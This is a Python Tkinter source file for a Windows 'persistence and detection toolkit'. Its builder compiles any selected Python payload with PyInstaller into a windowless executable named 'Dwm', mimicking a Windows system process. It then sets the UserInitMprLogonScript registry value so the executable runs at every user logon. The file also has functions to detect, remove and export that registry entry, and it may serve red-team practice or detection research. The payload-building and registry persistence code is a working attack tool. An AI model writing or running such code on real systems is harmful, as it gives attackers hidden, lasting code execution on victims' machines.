#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox
from datetime import datetime

import winreg
import PyInstaller.__main__


REG_HIVE = winreg.HKEY_CURRENT_USER
REG_PATH = r"Environment"
REG_VALUE_NAME = "UserInitMprLogonScript"



# -----------------------------------------------------------
# DETECTOR FUNCTIONS
# -----------------------------------------------------------

def query_logon_script():
    try:
        reg = winreg.ConnectRegistry(None, REG_HIVE)
        key = winreg.OpenKey(reg, REG_PATH, 0, winreg.KEY_READ)
        value, rtype = winreg.QueryValueEx(key, REG_VALUE_NAME)
        winreg.CloseKey(key)
        reg.Close()
        return value.strip() if value else None
    except FileNotFoundError:
        return None
    except Exception as e:
        return None


def get_file_metadata(path):
    if not os.path.isfile(path):
        return None

    stat = os.stat(path)
    return {
        "exists": True,
        "size_bytes": stat.st_size,
        "created": datetime.fromtimestamp(stat.st_ctime).isoformat(),
        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
    }


def clear_logon_script():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, REG_VALUE_NAME)
        winreg.CloseKey(key)
        return True
    except FileNotFoundError:
        return False
    except Exception:
        return False



# -----------------------------------------------------------
# BUILDER FUNCTIONS
# -----------------------------------------------------------

def build_exe(script_path, exe_name="PayloadExecutable", icon_path=None):
    if not os.path.isfile(script_path):
        raise Exception("Script not found: {}".format(script_path))

    args = [
        "--onefile",
        "--noconsole",
        "--name={}".format(exe_name),
        script_path
    ]

    if icon_path:
        args.append("--icon={}".format(icon_path))

    PyInstaller.__main__.run(args)

    built_exe = os.path.join("dist", exe_name + ".exe")
    if os.path.exists(built_exe):
        shutil.move(built_exe, os.getcwd())

    # Clean up after building
    for item in ["build", "dist", "__pycache__", "{}.spec".format(exe_name)]:
        if os.path.exists(item):
            try:
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)
            except:
                pass

    return os.path.abspath(exe_name + ".exe")



# -----------------------------------------------------------
# GUI APPLICATION
# -----------------------------------------------------------

class UnifiedPersistenceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Unified Persistence Toolkit (Python 3)")
        self.root.geometry("750x500")

        self.script_path = ""
        self.exe_name = "Dwm"

        self.create_widgets()


    def create_widgets(self):

        title = tk.Label(self.root, text="Windows Persistence & Detection Toolkit", font=("Arial", 16, "bold"))
        title.pack(pady=10)

        # -----------------------------------------
        # PAYLOAD BUILDER
        # -----------------------------------------
        frame1 = tk.LabelFrame(self.root, text="Payload Builder", padx=10, pady=10)
        frame1.pack(fill="x", padx=10, pady=10)

        tk.Button(frame1, text="Select Python File", command=self.select_script).pack(pady=5)
        self.script_label = tk.Label(frame1, text="Selected: None")
        self.script_label.pack()

        tk.Button(frame1, text="Build EXE", command=self.build_payload_exe).pack(pady=5)

        # -----------------------------------------
        # PERSISTENCE MANAGEMENT
        # -----------------------------------------
        frame2 = tk.LabelFrame(self.root, text="Registry Persistence (UserInitMprLogonScript)", padx=10, pady=10)
        frame2.pack(fill="x", padx=10, pady=10)

        tk.Button(frame2, text="Set Persistence", command=self.set_persistence).pack(pady=5)
        tk.Button(frame2, text="Verify Persistence", command=self.verify_persistence).pack(pady=5)
        tk.Button(frame2, text="Remove Persistence", command=self.remove_persistence).pack(pady=5)

        # -----------------------------------------
        # DETECTOR & LOGGING
        # -----------------------------------------
        frame3 = tk.LabelFrame(self.root, text="Detection / JSON / Logging", padx=10, pady=10)
        frame3.pack(fill="x", padx=10, pady=10)

        tk.Button(frame3, text="Run Detection", command=self.run_detection).pack(pady=5)
        tk.Button(frame3, text="Export Detection JSON", command=self.export_json).pack(pady=5)
        tk.Button(frame3, text="Save Log File", command=self.save_log).pack(pady=5)

        self.output_box = tk.Text(self.root, height=10, wrap="word")
        self.output_box.pack(fill="both", padx=10, pady=10)


    # -----------------------------------------------------------
    # GUI ACTION FUNCTIONS
    # -----------------------------------------------------------

    def log(self, msg):
        self.output_box.insert("end", msg + "\n")
        self.output_box.see("end")


    def select_script(self):
        self.script_path = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        self.script_label.config(text=self.script_path)


    def build_payload_exe(self):
        if not self.script_path:
            messagebox.showerror("Error", "No Python payload selected.")
            return

        try:
            exe_path = build_exe(self.script_path, self.exe_name)
            self.log("[+] Built EXE: {}".format(exe_path))
        except Exception as e:
            messagebox.showerror("Build Error", str(e))


    def set_persistence(self):
        exe_path = os.path.abspath(self.exe_name + ".exe")
        if not os.path.exists(exe_path):
            messagebox.showerror("Error", "Executable {}.exe not found".format(self.exe_name))
            return

        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, REG_VALUE_NAME, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            self.log("[+] Persistence set: {}".format(exe_path))
        except Exception as e:
            messagebox.showerror("Registry Error", str(e))


    def verify_persistence(self):
        value = query_logon_script()
        if value:
            self.log("[!] Persistence Found: {}".format(value))
        else:
            self.log("[+] No persistence configured.")


    def remove_persistence(self):
        if clear_logon_script():
            self.log("[+] Persistence entry removed.")
        else:
            self.log("[*] No persistence entry found.")


    def run_detection(self):
        value = query_logon_script()
        if not value:
            self.log("[+] No persistence detected.")
            return

        info = get_file_metadata(value)
        self.log("[!] Persistence Detected:")
        self.log("    Path: {}".format(value))

        if info:
            for k, v in info.items():
                self.log("    {}: {}".format(k, v))
        else:
            self.log("    File does NOT exist.")


    def export_json(self):
        value = query_logon_script()
        output = {
            "configured": bool(value),
            "path": value,
            "metadata": get_file_metadata(value) if value else None
        }

        savepath = filedialog.asksaveasfilename(defaultextension=".json")
        if savepath:
            with open(savepath, "w") as f:
                json.dump(output, f, indent=2)
            self.log("[+] JSON exported to {}".format(savepath))


    def save_log(self):
        savepath = filedialog.asksaveasfilename(defaultextension=".txt")
        if savepath:
            with open(savepath, "w") as f:
                f.write(self.output_box.get("1.0", "end"))
            self.log("[+] Log saved to {}".format(savepath))



# -----------------------------------------------------------
# MAIN LAUNCHER
# -----------------------------------------------------------

if __name__ == "__main__":
    root = tk.Tk()
    UnifiedPersistenceGUI(root)
    root.mainloop()
